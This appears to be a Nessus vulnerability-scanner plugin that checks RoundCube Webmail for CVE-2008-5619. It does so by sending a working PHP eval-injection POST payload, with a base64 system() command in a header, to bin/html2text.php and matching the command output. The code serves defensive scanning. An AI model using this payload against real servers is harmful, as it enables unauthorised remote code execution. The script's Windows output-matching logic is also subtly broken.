#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(35273);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2008-5619");
  script_bugtraq_id(32799);
  script_xref(name:"milw0rm", value:"7549");
  script_xref(name:"milw0rm", value:"7553");
  script_xref(name:"OSVDB", value:"50694");

  script_name(english:"RoundCube Webmail bin/html2text.php Post Request Remote PHP Code Execution");
  script_summary(english:"Tries to run an arbitrary command");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows execution of
arbitrary commands." );
 script_set_attribute(attribute:"description", value:
"The remote host is running RoundCube Webmail, a web-based IMAP client
written in PHP. 

The version of RoundCube Webmail installed on the remote host allows
execution of arbitrary commands via the embedded html2text conversion
library from chuggnutt.com.  Using a specially crafted POST request,
an unauthenticated remote attacker can leverage this issue to execute
arbitrary PHP code on the affected host subject to the privileges
under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://trac.roundcube.net/ticket/1485618" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/499489/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/forum/forum.php?forum_id=898542" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to RoundCube Webmail 0.2-beta2 or apply the 0.2-beta patch
referenced in the forum posting above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/roundcube", "/roundcubemail", "/rc", "/email", "/imap", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/bin/html2text.php");

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # If it does...
  ctype = "";
  foreach line (split(res[1], keep:FALSE))
    if ("content-type" >< tolower(line))
    {
      ctype = line;
      break;
    }

  if (ctype && "text/plain; charset=UTF-8" >< ctype)
  {
    # Try to exploit the issue to run a command.
    foreach cmd (cmds)
    {
      var = string("NESSUS_", toupper(rand_str()));
      exploit = string("{${eval(base64_decode($_SERVER[HTTP_", var, "]))}}");
      postdata = string("<b>", exploit, "</b>");

      req = http_mk_post_req(
        port        : port,
        version     : 11, 
        item        : url, 
        add_headers : make_array(var, base64(str:string("system('", cmd, "');"))),
        data        : postdata
      );
      res = http_send_recv_req(port:port, req:req);
      if (res == null) exit(0);

      # There's a problem if we see the expected command output.
      if ('ipconfig' >< exploit) pat = cmd_pats['ipconfig'];
      else pat = cmd_pats['id'];

      if (egrep(pattern:pat, string:res[2]))
      {
        if (report_verbosity > 0)
        {
          req_str = http_mk_buffer_from_req(req:req);
          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote \n",
            "host using the following request :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:req_str), "\n"
          );
          if (report_verbosity > 1)
          {
            output = res[2];
            report = string(
              report,
              "\n",
              "It produced the following output :\n",
              "\n",
              "  ", str_replace(find:'\n', replace:'\n  ', string:output), "\n"
            );
          }
          security_hole(port:port, extra:report);
        }
        else security_hole(port);

        exit(0);
      }
    }
  }
}
